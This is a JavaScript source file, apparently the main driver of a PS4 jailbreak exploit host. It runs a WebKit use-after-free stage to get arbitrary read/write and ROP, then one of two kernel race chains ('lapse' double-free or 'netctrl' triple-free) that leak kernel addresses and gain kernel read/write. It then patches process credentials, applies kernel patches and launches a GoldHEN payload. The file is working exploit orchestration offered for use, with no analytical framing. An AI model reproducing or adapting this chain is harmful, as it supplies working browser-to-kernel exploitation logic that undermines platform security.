/* ============================================================
   CSSFontFace GoldHEN Host — main exploit orchestrator
   Stable one-click flow with per-stage verification and
   guarded cleanup. ES2017-compatible (PS4 WebKit).
   ============================================================ */

var _loadedScripts = {};
var _jbRunning = false;
var _kernelStageReached = false;
var _payloadStageReached = false;

function load_script(src) {
  return new Promise(function (resolve, reject) {
    if (_loadedScripts[src]) {
      resolve();
      return;
    }

    var attempts = 0;

    function tryLoad() {
      var script = document.createElement("script");
      script.src = src;
      script.onload = function () {
        _loadedScripts[src] = true;
        resolve();
      };
      script.onerror = function () {
        // Remove the failed node so a retry starts from a clean state
        if (script.parentNode) {
          script.parentNode.removeChild(script);
        }
        attempts++;
        if (attempts < 2) {
          try { logger.log("[!] Script load failed, retrying: " + src); } catch (e) {}
          setTimeout(tryLoad, 200);
        } else {
          reject(new Error("Failed to load script: " + src));
        }
      };
      document.head.appendChild(script);
    }

    tryLoad();
  });
}

function waitMs(ms) {
  return new Promise(function (res) { setTimeout(res, ms); });
}

/* Fetch a binary with retries. Used as a fallback when the warm cache
   (preloaded during the countdown) is unavailable. */
async function fetchBufRetry(url, attempts) {
  attempts = attempts || 3;
  var lastErr = null;
  for (var i = 0; i < attempts; i++) {
    try {
      var rsp = await fetch(url);
      if (!rsp.ok) {
        throw new Error("HTTP " + rsp.status);
      }
      var buf = await rsp.arrayBuffer();
      if (buf && buf.byteLength > 0) {
        return new Uint8Array(buf);
      }
      throw new Error("Empty response");
    } catch (e) {
      lastErr = e;
      await waitMs(250 * (i + 1));
    }
  }
  throw lastErr || new Error("Failed to fetch " + url);
}

function _ui() {
  return typeof window !== "undefined" && window.__jb ? window.__jb : null;
}

function pickChain() {
  var ui = _ui();
  if (ui && typeof ui.getChain === "function") {
    var chain = ui.getChain();
    if (chain === "lapse" || chain === "netctrl") {
      return chain;
    }
  }
  // Fallback: Lapse is the universal chain (6.00 – 11.02)
  return "lapse";
}

function safeCleanup() {
  if (typeof cleanup !== "function") {
    return;
  }
  try {
    cleanup();
  } catch (e) {
    logger.error("Cleanup error (non-fatal): " + e.message);
  }
}

function guard(fn, label) {
  try {
    fn();
  } catch (e) {
    logger.error("[" + label + "] warning: " + e.message);
  }
}

async function doJb() {
  if (_jbRunning) {
    logger.info("Jailbreak already running...");
    return;
  }
  _jbRunning = true;
  var alreadyRoot = false; // r5: true when the kernel is already jailbroken

  try {
    await load_script("src/misc.js");

    version.init();
    logger.info("Console: PS" + version.console + " " + version);

    var chain = pickChain();
    logger.info("Exploit chain: " + chain.toUpperCase());

    /* ================= USERLAND (WebKit) ================= */
    var phase = "webkit";
    var ui = _ui();
    if (ui) ui.setPhase(phase, "active");
    if (ui) ui.setStatus("WebKit stage — مرحلة ويب كيت (UAF/ARW)…", "running");

    try {
      switch (version.console) {
        case 4:
          await load_script("src/ps4/constants.js");
          await load_script("src/ps4/userland.js");
          break;
        default:
          throw new Error("Unsupported console: PS" + version.console);
      }

      var rw = undefined;
      if (arw.master === undefined) {
        rw = await init_rw();
      }

      init_arw(rw);
      init_rop();
      init_syscalls();

      // Verify userland primitives are really in place
      if (arw.master === undefined || typeof arw.view !== "function" || typeof arw.addrof !== "function") {
        throw new Error("ARW primitives missing after init");
      }

      if (ui) ui.setPhase(phase, "done");
      // Give the PS4 WebKit/worker state a short settling window before
      // entering the kernel race. This is intentionally conservative.
      await sleep(300);

      /* ---- r5: already-jailbroken probe ----
         GoldHEN persists until reboot. If the kernel was jailbroken by an
         earlier run in this boot, re-running the double-free kernel race is
         pure risk: a second pass over corrupted malloc zones can alias
         important kernel data and panic the console (the "powers off"
         symptom). setuid(0) is harmless when unprivileged (returns -1) and
         only succeeds once the ucred has been patched, so we probe first
         and skip the entire kernel chain when it already works. */
      if (fn.setuid === undefined) {
        fn.setuid = new NativeFunction(0x17, "number");
      }
      try {
        alreadyRoot = fn.setuid.invoke(0) === 0;
      } catch (e2) {
        alreadyRoot = false;
      }
      if (alreadyRoot) {
        logger.info("Kernel already jailbroken (setuid(0) OK) — skipping kernel chain");
      }
    } catch (e) {
      e.jbPhase = phase;
      throw e;
    }

    /* ================= KERNEL CHAIN ================= */
    phase = "kernel";
    if (alreadyRoot) {
      // r5: skipped — kernel privileges already in place this boot
      if (ui) ui.setPhase(phase, "done");
      if (ui) ui.setStatus("Kernel already jailbroken — skipped race. تم تجاوز سباق النواة", "running");
    } else {
      if (ui) ui.setPhase(phase, "active");
      if (ui) ui.setStatus("Kernel stage — مرحلة النواة: " + chain.toUpperCase() + "…", "running");
    }

    try {
      if (alreadyRoot) {
        // no chain to run — jump straight to the payload stage
      } else {
        _kernelStageReached = true;
      await load_script("src/loader.js");
      await load_script("src/workers.js");

      switch (version.console) {
        case 4:
          await load_script("src/ps4/kernel.js");
          break;
        default:
          throw new Error("Unsupported console: PS" + version.console);
      }

      await load_script("src/" + chain + ".js");

      try {
        if (chain === "lapse") {
          init();
          await setup();
          await double_free_reqs2();
          leak_kaddrs();
          double_free_reqs1();
          make_karw();

          // Increase reference counts for the pipes
          inc_karw_pipe_refcnt();

          logger.info("Corrupted context cleanup started...");

          // Remove pktinfo pointers
          guard(function () { remove_pktinfo_from_so(pktopts_twins[0]); }, "pktinfo");

          // Remove rthdr pointers
          guard(function () { remove_rthdr_from_so(pktopts_twins[1]); }, "rthdr1");
          guard(function () { remove_rthdr_from_so(rthdr_twins[0]); }, "rthdr2");

          logger.info("Corrupted context cleanup completed !!");
        } else {
          init();
          await setup();
          await ucred_triple_free();
          leak_kqueue();
          await make_karw();

          inc_karw_pipe_refcnt();

          logger.info("Corrupted context cleanup started...");

          // Remove rthdr pointers from triplets
          for (var i = 0; i < triplets.length; i++) {
            guard((function (idx) {
              return function () { remove_rthdr_from_so(triplets[idx]); };
            })(i), "triplet" + i);
          }

          // Remove triple freed file from free list
          guard(function () { remove_uaf_file(); }, "uaf_file");

          logger.info("Corrupted context cleanup completed !!");
        }
      } finally {
        // Cleanup must never block the jailbreak, but still runs on failure
        safeCleanup();
      }
      } // end if (!alreadyRoot) — chain skipped when already jailbroken

      if (!alreadyRoot && (kernel_base === undefined || kernel_base.eq(0))) {
        throw new Error("kernel_base not resolved — chain did not reach ARW");
      }

      if (ui) ui.setPhase(phase, "done");
      // Let the kernel ARW/pipe state settle before applying patches/payload.
      await sleep(300);
    } catch (e) {
      e.jbPhase = phase;
      throw e;
    }

    /* ================= JAILBREAK + PATCHES + PAYLOAD ================= */
    phase = "payload";
    if (ui) ui.setPhase(phase, "active");
    if (ui) ui.setStatus("Jailbreak — تفعيل الصلاحيات…", "running");

    try {
      _payloadStageReached = true;

      if (!alreadyRoot) {
        // Normal path: jailbreak from scratch this boot
        find_all_proc();

        // Avoid reapplying if already done
        if (fn.setuid.invoke(0) === -1) {
          jailbreak();

          // Verify the jailbreak actually took effect
          if (fn.setuid.invoke(0) === -1) {
            throw new Error("Jailbreak verification failed (setuid(0) still fails)");
          }
          logger.info("Jailbreak verified (setuid(0) OK)");

          // Prefer the warm cache (fetched during the countdown) so the
          // post-jailbreak path does zero network I/O; fall back to fetch+retry.
          var kpatchUrl = "src/ps4/patches/" + constants.KPATCH;
          var kpatches_u8 = null;
          if (typeof window !== "undefined" && window.__warm && window.__warm[kpatchUrl]) {
            kpatches_u8 = window.__warm[kpatchUrl];
            logger.debug("Using warm kernel patches (" + kpatches_u8.length + " bytes)");
          } else {
            kpatches_u8 = await fetchBufRetry(kpatchUrl, 3);
          }
          if (kpatches_u8.length === 0) {
            throw new Error("Kernel patch file is empty");
          }

          kernel_patches(kpatches_u8);
          await sleep(150);
          logger.info("Kernel patches applied (" + constants.KPATCH + ")");
        }
      } else {
        // r5: kernel already jailbroken — do NOT re-run jailbreak() or
        // kernel_patches() (kexec). Just (re)launch the GoldHEN loader,
        // which is idempotent (it exits early if already installed).
        logger.info("Already jailbroken (probe) — kernel chain skipped, loading GoldHEN only");
        // loader.js is normally loaded inside the kernel stage, which we
        // skipped — load it here (idempotent) so load_bin() primitives exist.
        await load_script("src/loader.js");
      }

      // Load the GoldHEN loader (idempotent — safe in both paths)
      var bin_u8 = null;
      if (typeof window !== "undefined" && window.__warm && window.__warm["src/payload.bin"]) {
        bin_u8 = window.__warm["src/payload.bin"];
        logger.debug("Using warm GoldHEN payload (" + bin_u8.length + " bytes)");
      } else {
        bin_u8 = await fetchBufRetry("src/payload.bin", 3);
      }
      if (bin_u8.length === 0) {
        throw new Error("GoldHEN payload is empty");
      }

      // Short delay after kpatches reduces contention before pthread_create.
      await sleep(150);
      load_bin(bin_u8);
      logger.info("GoldHEN payload launched !!");

      if (ui) ui.setPhase(phase, "done");
      if (ui) ui.onSuccess(false);
    } catch (e) {
      e.jbPhase = phase;
      throw e;
    }

    logger.info("===END===");
  } catch (e) {
    var jbPhase = e.jbPhase || "unknown";
    logger.error("[" + jbPhase.toUpperCase() + "] " + e.message);
    if (e.stack) {
      logger.error(e.stack);
    }
    var ui2 = _ui();
    if (ui2) {
      ui2.setStatus("Failed at " + jbPhase + " — فشل في مرحلة " + jbPhase + ": " + e.message, "err");
      ui2.onError(jbPhase, e.message);
    }
  } finally {
    _jbRunning = false;
  }
}
